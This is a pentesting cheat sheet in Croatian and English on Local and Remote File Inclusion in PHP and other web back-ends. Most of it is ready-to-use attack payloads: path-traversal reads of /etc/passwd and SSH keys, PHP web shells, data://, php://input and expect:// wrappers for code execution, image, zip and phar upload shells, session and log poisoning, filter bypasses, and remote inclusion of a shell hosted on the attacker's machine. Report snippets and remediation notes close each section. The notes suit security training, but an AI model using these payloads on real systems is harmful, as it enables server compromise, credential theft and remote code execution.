# File Inclusion

## Local File Inclusion (LFI)

### What / when it appears
Manipulacija user-controlled parametra da back-end funkcija učita **lokalni** fajl. Najčešće u **templating engines** (statični header/footer + dinamički content preko parametra). Signali za posumnjati: parametri tipa `?language=es.php`, `?page=about`, `?file=`, `?view=`, ili path segment `/about/en`. Vodi na source disclosure, sensitive data exposure i (uz execute-capable funkciju) RCE.

Vulnerable funkcije i ovlasti — **execute** vodi na RCE, **read** samo na source:

| Funkcija | Read | Execute | Remote URL |
|---|---|---|---|
| PHP `include()`/`include_once()` | ✅ | ✅ | ✅ |
| PHP `require()`/`require_once()` | ✅ | ✅ | ❌ |
| PHP `file_get_contents()` | ✅ | ❌ | ✅ |
| PHP `fopen()`/`file()` | ✅ | ❌ | ❌ |
| NodeJS `fs.readFile()`/`fs.sendFile()` | ✅ | ❌ | ❌ |
| NodeJS `res.render()` | ✅ | ✅ | ❌ |
| Java `include` | ✅ | ❌ | ❌ |
| Java `import` | ✅ | ✅ | ✅ |
| .NET `@Html.Partial()` / `Response.WriteFile()` | ✅ | ❌ | ❌ |
| .NET `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| .NET `include` | ✅ | ✅ | ✅ |

### Recon / detection
Gađaj svaki parametar koji miriše na učitavanje fajla/stranice. Potvrdni test payloadi:
```
# Linux
http://<TARGET>/index.php?language=/etc/passwd
# Windows
http://<TARGET>/index.php?language=C:\Windows\boot.ini
# ako je path prependan/appendan -> path traversal
http://<TARGET>/index.php?language=../../../../etc/passwd
```
Verbose PHP error otkriva točan string koji ide u `include()` → vidiš prefix/suffix koji app dodaje. Napadi ne ovise o errorima, ali pomažu za razumijevanje handlinga.

### Exploitation

**Basic LFI (absolute path)** — kad cijeli input ide u `include($_GET['language'])`:
```
?language=/etc/passwd
```

**Path traversal** — kad se prependa direktorij (`include("./languages/" . $input)`):
```
?language=../../../../etc/passwd
```
`/var/www/html/` = 3 dubine od root → `../../../`. Višak `../` ne kvari path (radi i 100x), ali za report koristi minimalan broj.

**Filename prefix** — kad je `include("lang_" . $input)`, prefiksaj `/`:
```
?language=/../../../etc/passwd
```
(Može ne raditi ako `lang_/` direktorij ne postoji; prefix može slomiti wrapper/RFI tehnike.)

**Appended extension** — kad je `include($input . ".php")`. Modern PHP: restrikcija na `.php` → koristi PHP filters za source read (dolje) ili obsolete bypass (Filter sekcija).

**PHP Filters — source code disclosure** (za appended `.php` ili za čitanje sourcea umjesto izvršavanja):
```
# fuzz php fajlove prvo
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<TARGET>/FUZZ.php
# base64-encode source (.php se auto-appenda -> resource=config == config.php)
?language=php://filter/read=convert.base64-encode/resource=config
# decode
echo 'PD9waHAK...' | base64 -d
```
Skeniraj sve status kodove (200/301/302/403), ne samo 200 — LFI čita source svejedno. Iz sourcea traži reference na druge PHP fajlove i čitaj i njih.

**PHP Wrappers — RCE** (`data://` i `php://input` traže `allow_url_include=On`):
```
# 1) provjeri config (Apache: apache2, Nginx: fpm; probaj najnoviju verziju pa niže)
curl "http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo 'W1BIUF0K...' | base64 -d | grep allow_url_include   # -> On

# data:// wrapper (base64 web shell, URL-encoded)
echo '<?php system($_GET["cmd"]); ?>' | base64            # PD9waHAgc3lzdGVt...
curl -s 'http://<TARGET>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'

# php://input (payload u POST body; parametar mora primati POST; cmd preko GET traži $_REQUEST)
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<TARGET>/index.php?language=php://input&cmd=id"

# expect:// (traži extension=expect u php.ini; provjeri pa testiraj direktno)
echo 'W1BIUF0K...' | base64 -d | grep expect               # -> extension=expect
curl -s "http://<TARGET>/index.php?language=expect://id"
```

**LFI + File Uploads — RCE** (treba execute-capable funkciju; upload forma NE mora biti ranjiva, samo dopustiti upload):
```
# Image (magic bytes GIF8 zaobilaze content-check)
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# upload -> uzmi path iz <img src="/profile_images/shell.gif"> -> include
?language=./profile_images/shell.gif&cmd=id

# Zip wrapper (zip:// nije uvijek enabled)
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

# Phar wrapper
# shell.php:
#   <?php $phar=new Phar('shell.phar'); $phar->startBuffering();
#   $phar->addFromString('shell.txt','<?php system($_GET["cmd"]); ?>');
#   $phar->setStub('<?php __HALT_COMPILER(); ?>'); $phar->stopBuffering();
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
Image metoda je najpouzdanija; zip/phar kao fallback. Ako funkcija prependa dir, `../` van njega pa dodaj upload path.

**Log Poisoning — RCE** (app treba read nad logom):
```
# PHP Session -> /var/lib/php/sessions/sess_<PHPSESSID> (Linux), C:\Windows\Temp\ (Win)
# 1) potvrdi kontrolu nad 'page' vrijednosti
?language=session_poisoning
# 2) poison webshellom (URL-encoded <?php system($_GET["cmd"]);?>)
?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
# 3) include session file (re-poison prije SVAKE komande -> overwrita se)
?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id

# Apache/Nginx access.log -> poison User-Agent
# Nginx log čitljiv za www-data; Apache root/adm (osim old/misconfig)
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<TARGET>/index.php" -H @Poison
?language=/var/log/apache2/access.log&cmd=id
# putanje: /var/log/apache2/ , /var/log/nginx/ (Linux) | C:\xampp\apache\logs\ , C:\nginx\log\ (Win)
```
Bilo koji request se logira → možeš poisonati bilo koji, ne samo LFI. Ostali izvori za poison/read: `/proc/self/environ`, `/proc/self/fd/N` (N ~0-50), `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log` (login s username=PHP kod, ili mail body s PHP kodom). Logovi su veliki → oprezno u produkciji (može crashati server).

**Second-Order** — poison DB entry (npr. `username=../../../etc/passwd`), druga funkcija (npr. avatar download `/profile/$username/avatar.png`) pulls poisoned value → LFI. Developeri filtriraju direktan input ali vjeruju DB vrijednostima.

### Filter / WAF bypass
```
# Non-recursive ../ strip (str_replace jednom, ne rekurzivno, ne na outputu)
?language=....//....//....//....//etc/passwd
# alternative: ..././   ....\/   ....////

# URL encoding (encode I točke!)  ../ -> %2e%2e%2f
?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
# double-encode za jače filtere (Burp Decoder x2)

# Approved-path regex (npr. mora poč. s ./languages/) -> zadovolji pa traverziraj
?language=./languages/../../../../etc/passwd
# kombiniraj s encoding/recursive ako se filteri lančaju
```

**Appended extension bypass (OBSOLETE — samo PHP < 5.3/5.4 odn. < 5.5):**
```
# Path truncation (4096 char limit, PHP trima trailing / i /.)
# mora poč. nepostojećim direktorijem
?language=non_existing_directory/../../../etc/passwd/./././...  (~2048x ./)
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

# Null byte (PHP < 5.5) -> .php se odsjeca
?language=/etc/passwd%00
```

### Escalation / chaining
- **Source disclosure → creds/keys → direct access:** iz `config.php` izvuci DB password (često reused → SSH login); iz `~/.ssh/id_rsa` (loši permisi) grab private key → SSH.
- **Read → RCE:** bilo koja execute-capable funkcija + wrappers (`data`/`input`/`expect`) / file upload / log poisoning → shell.
- **SSRF:** `php://` filter / lokalni includes mogu hitati local-only PHP stranice (npr. config koje nemaš direktno).
- **Second-order** preko DB-stored vrijednosti (username, itd.).
- Nakon poison-shell-a → napiši permanent web shell u web dir ili baci reverse shell (poison se overwrita).

### Tools & wordlists
```
# Fuzz PHP fajlova / direktorija
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<TARGET>/FUZZ.php

# Fuzz skrivenih parametara
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<TARGET>/index.php?FUZZ=value' -fs <BASELINE_SIZE>

# Fuzz LFI payloada (bypass-i + common files)
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET>/index.php?language=FUZZ' -fs <BASELINE_SIZE>

# Nađi webroot path (za absolute-path include uploada)
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<TARGET>/index.php?language=../../../../FUZZ/index.php' -fs <BASELINE_SIZE>

# Fuzz server config/log fajlova (preciznije od Jhaddix za putanje)
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<TARGET>/index.php?language=../../../../FUZZ' -fs <BASELINE_SIZE>

# Hosting za RFI / upload servisi
sudo python3 -m http.server <LISTENING_PORT>
sudo python -m pyftpdlib -p 21
impacket-smbserver -smb2support share $(pwd)
```
Alati: `ffuf`, `gobuster`, `base64`, `curl`, **Burp Suite** (Decoder za URL/double encode). Config→log chain: pročitaj `/etc/apache2/apache2.conf` (DocumentRoot, ${APACHE_LOG_DIR}) pa `/etc/apache2/envvars` za vrijednost varijable.
Wordliste: `LFI-Jhaddix.txt`, `default-web-root-directory-linux.txt`, `default-web-root-directory-windows.txt`, `LFI-WordList-Linux`/`-Windows` (nisu u seclists — download).
LFI tools (python2, nemaintenirani, manje pouzdani od manual): **LFISuite, LFiFreak, liffy**.

### Report snippet
- **CWE:** CWE-98 (Improper Control of Filename for Include/Require Statement in PHP Program); CWE-22 (Path Traversal) za traversal komponentu.
- **CVSS v3.1 (baseline):** read-only `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = **7.5 High**; uz RCE (wrappers/upload/log) `C:H/I:H/A:H` = **9.8 Critical**. Prilagodi po stvarnom findingu.
- **Impact:** Neautentificirani napadač čita proizvoljne lokalne fajlove (source, creds, keys), a uz execute-capable funkciju eskalira na remote code execution i potpuni kompromis back-enda.
- **Remediation:** Ne prosljeđuj user input u inclusion funkcije. Ako nužno → **whitelist** (ID→file map / case-match / static json). `basename()` za strip pathа (pazi edge case: bash wildcard `.?/.*` bypass ako se poziva `system()`). Rekurzivna sanitizacija: `while(substr_count($input,'../',0)){ $input=str_replace('../','',$input); }`. `allow_url_fopen=Off`, `allow_url_include=Off`, `open_basedir=/var/www`, disable `expect`/`mod_userdir`. Docker / web-root lock. WAF (ModSecurity, permissive mode).

### Quick checklist
- [ ] Fuzzao skrivene parametre (`burp-parameter-names.txt`) + probao `/etc/passwd` i `../../../../etc/passwd`?
- [ ] Provjerio prefix/suffix (error) → primijenio prefix `/`, appended-ext bypass, ili PHP filter za source?
- [ ] Ako filter blokira → probao `....//`, `%2e%2e%2f`, double-encode, approved-path prefix?
- [ ] Provjerio `allow_url_include` i pokušao RCE (data/input/expect wrapper, upload, log poisoning)?

## Remote File Inclusion (RFI)

### What / when it appears
File inclusion gdje vulnerable funkcija dopušta **remote URL**. Dva benefita: (1) **SSRF** — enumeracija local-only portova/aplikacija; (2) **RCE** — include malicioznog skripta koji sam hostam. Skoro svaki RFI je i LFI, ali LFI nije nužno RFI jer: funkcija možda ne dopušta remote URL; možda kontroliraš samo dio filename-a a ne protocol wrapper (`http://`, `ftp://`); config često disable-a RFI (`allow_url_include` default Off).

Funkcije koje dopuštaju remote URL (i execute gdje ✅):

| Funkcija | Read | Execute | Remote URL |
|---|---|---|---|
| PHP `include()`/`include_once()` | ✅ | ✅ | ✅ |
| PHP `file_get_contents()` | ✅ | ❌ | ✅ |
| Java `import` | ✅ | ✅ | ✅ |
| .NET `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| .NET `include` | ✅ | ✅ | ✅ |

(Funkcije bez execute → RFI koristiš samo za SSRF, ne RCE.)

### Recon / detection
`allow_url_include=On` (provjera preko LFI + php filter, kao gore) je indikator ali **nije pouzdan** — funkcija svejedno možda ne dopušta remote. Pouzdanije: pokušaj includati URL. Prvo **lokalni** URL da izbjegneš firewall block:
```
?language=http://127.0.0.1:80/index.php
```
Ako se stranica renderira → RFI + PHP execution potvrđen; port 80 dostupan → probaj druge portove (SSRF). **Ne** includaj vulnerable stranicu preko public URL-a bez potrebe → recursive loop / DoS.

### Exploitation
```
# maliciozni shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# HTTP (koristi 80/443 -> veća šansa da prođe firewall/whitelist)
sudo python3 -m http.server <LISTENING_PORT>
?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

# FTP (fallback ako je http port/string blokiran WAF-om)
sudo python -m pyftpdlib -p 21
?language=ftp://<OUR_IP>/shell.php&cmd=id
# ako traži auth:
curl 'http://<TARGET>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'

# SMB (Windows target) -> NE treba allow_url_include (UNC path = normalan file)
impacket-smbserver -smb2support share $(pwd)
?language=\\<OUR_IP>\share\shell.php&cmd=whoami
# radi pouzdano samo na istoj mreži (remote SMB često disabled)
```
Provjeri connection na svom serveru — ako se doda ekstra `.php` u requestu, izostavi ga iz payloada.

### Filter / WAF bypass
Isti principi kao LFI (URL encoding, itd.). Specifično za RFI: ako je `http://` string blokiran → koristi `ftp://` ili SMB hosting; koristi port 80/443 jer su češće whitelistani za outbound.

### Escalation / chaining
- **RCE** direktno preko hostanog shella (include+execute funkcija).
- **SSRF** kad funkcija dopušta remote ali ne execute → enumeriraj interne portove/servise (`http://127.0.0.1:<PORT>/`), lančaj sa Server-side Attacks tehnikama.
- Windows + SMB → RCE bez ijedne non-default postavke.

### Tools & wordlists
```
sudo python3 -m http.server <LISTENING_PORT>     # HTTP hosting
sudo python -m pyftpdlib -p 21                   # FTP hosting
impacket-smbserver -smb2support share $(pwd)     # SMB hosting (Windows target)
```
Web shell: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`. Za SSRF enumeraciju vidi Server-side Attacks modul.

### Report snippet
- **CWE:** CWE-98 (Improper Control of Filename for Include/Require Statement in PHP Program).
- **CVSS v3.1 (baseline):** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8 Critical** (RFI→RCE). Ako samo SSRF bez execute → downgrade (npr. `C:H/I:N/A:N` = 7.5).
- **Impact:** Napadač uključuje udaljeni skript pod svojom kontrolom i izvršava proizvoljne komande na serveru (RCE), ili preko SSRF-a doseže interne servise nedostupne izvana.
- **Remediation:** `allow_url_include=Off` i `allow_url_fopen=Off`. Ne prosljeđuj user input u inclusion funkcije; whitelist dozvoljenih vrijednosti. Blokiraj outbound konekcije s aplikacijskog servera. Windows: ograniči/blokiraj remote SMB.

### Quick checklist
- [ ] Potvrdio remote include lokalnim URL-om (`http://127.0.0.1:80/index.php`) prije eksterne konekcije?
- [ ] Hostao `shell.php` (HTTP 80/443, pa FTP/SMB kao fallback) i dobio exec preko `&cmd=`?
- [ ] Windows target → probao SMB UNC path (ne treba `allow_url_include`)?
- [ ] Bez execute → mapirao SSRF na interne portove?
